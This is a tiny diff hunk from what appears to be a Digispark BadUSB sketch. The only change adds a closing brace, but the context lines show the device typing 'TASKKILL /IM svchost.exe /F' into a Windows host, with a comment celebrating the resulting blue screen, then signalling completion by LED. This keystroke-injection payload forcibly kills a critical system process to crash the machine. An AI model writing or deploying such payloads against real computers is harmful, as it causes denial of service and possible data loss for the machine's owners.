@@ -31,3 +31,4 @@ void loop() {
     DigiKeyboard.println("TASKKILL /IM svchost.exe /F"); // BSOD Achieved
     digitalWrite(1, LOW); // Turn off LED to signify task completed
     for(;;){}
+}
